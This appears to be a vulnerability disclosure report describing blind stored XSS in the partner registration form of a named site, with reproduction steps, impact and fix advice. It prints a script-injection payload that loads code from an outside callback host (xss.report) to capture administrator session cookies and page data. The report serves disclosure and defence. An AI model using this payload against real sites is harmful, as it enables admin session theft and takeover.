## Title
Blind Stored Cross-Site Scripting (XSS) via Partner Registration Form - Admin Panel Execution on Partners Portal

## Vulnerability Type
Blind Stored XSS (Out-of-Band)


## Summary
The partner registration form at `https://kzlabs.in/subdomains/partners/?view=register` accepts and stores user-supplied input in the Full Name and Company Name fields without sanitization or output encoding. The payload does not execute on the public-facing registration page - instead it fires when an administrator reviews the partner registration submission in the backend admin panel, confirmed via an out-of-band callback to `xss.report`.

## Vulnerable Endpoint
**Injection point (public):** `https://kzlabs.in/subdomains/partners/?view=register`

**Execution point (backend):** Admin panel - exact URL confirmed via xss.report callback

## Vulnerable Fields
| Field | Notes |
|---|---|
| Full Name | Stored, executes in admin panel |
| Company Name | Stored, executes in admin panel |

## Steps to Reproduce

### Step 1 - Register with blind XSS payload
1. Navigate to `https://kzlabs.in/subdomains/partners/?view=register`
2. Fill the registration form with the following payload in both fields:
   - **Full Name:** `'"><script src=https://xss.report/c/tanishq></script>`
   - **Company Name:** `'"><script src=https://xss.report/c/tanishq></script>`
   - Use valid placeholder values for all other required fields.
3. Submit the registration form.

### Step 2 - Wait for admin to review the registration
1. The partner registration appears in the admin panel for review/approval.
2. When the administrator opens the registration submission, the injected `<script>` tag loads and executes the payload hosted at `https://xss.report/c/tanishq`.

### Step 3 - Verify execution via xss.report callback
1. Log in to your `xss.report` dashboard.
2. Observe the incoming notification confirming payload execution in the admin's browser context, including:
   - Admin panel URL where the payload fired
   - Admin session cookies
   - Browser and OS details
   - Screenshot of the admin panel (if enabled)

## Payload Used
```
'"><script src=https://xss.report/c/tanishq></script>
```

## Proof of Concept

<img width="1917" height="1027" alt="image" src="https://github.com/user-attachments/assets/8a43cd73-5dff-453e-a407-c53678d6e7aa" />
<img width="1917" height="1037" alt="image" src="https://github.com/user-attachments/assets/00d6ebcf-cf67-4200-b495-ad38dc97cacd" />


## Impact
Blind XSS executing in an admin panel carries significantly higher impact than standard user-facing XSS:

- **Admin session takeover** - the callback captures the administrator's session cookie, allowing the attacker to authenticate directly to the admin panel and gain full administrative access.
- **Partner data exposure** - the admin panel reviewing partner registrations likely displays sensitive business data (other partner details, contracts, internal configurations) visible in the xss.report screenshot.
- **Persistent execution** - payload fires every time the admin views the partner registration, providing repeated callbacks until the record is deleted.
- **Stealth** - no visible error or alert on the public registration page; the attack is completely silent from the victim's perspective.
- **Privilege escalation** - admin access gained via cookie theft can potentially lead to full application compromise, data exfiltration, or lateral movement depending on admin panel capabilities.

## Recommendations for Fix
1. Apply context-aware output encoding (e.g. `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` in PHP) on all registration fields — Full Name and Company Name specifically — before rendering them in the admin panel.
2. Implement a strict Content-Security-Policy header on the admin panel restricting `script-src` to self only and blocking external script sources, which would prevent `<script src=https://xss.report/...>` from loading even if a stored payload reaches the page.
3. Never render raw user-submitted registration data in the admin panel without output encoding — partner/user registration flows are a common Blind XSS vector precisely because the admin review interface is often built separately and overlooked during security testing.
4. Sanitize all fields in the registration form server-side at submission time, not just at display time.
